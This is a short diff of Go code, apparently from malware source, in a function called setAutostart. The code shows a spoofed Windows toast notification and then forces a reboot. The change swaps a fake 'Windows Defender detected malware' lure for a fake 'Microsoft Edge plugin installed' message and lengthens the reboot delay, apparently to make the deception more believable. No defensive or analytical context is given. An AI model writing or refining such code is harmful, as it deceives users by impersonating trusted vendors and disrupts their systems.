@@ -41,11 +41,11 @@ func setAutostart() {
 	if len(os.Args) < 2 {
 		notification := toast.Notification{
 			AppID:   "Microsoft.Windows.Shell.RunDialog",
-			Title:   "Windows Defender",
-			Message: "Detected malware, system will reboot to recover",
+			Title:   "Microsoft Edge",
+			Message: "Plugin has been installed successfully, system will reboot in 15 seconds to save changes",
 		}
 		_ = notification.Push()
-		_ = exec.Command("shutdown", "-r", "-t", "10").Run()
+		_ = exec.Command("shutdown", "-r", "-t", "15").Run()
 		os.Exit(0)
 	}
 }
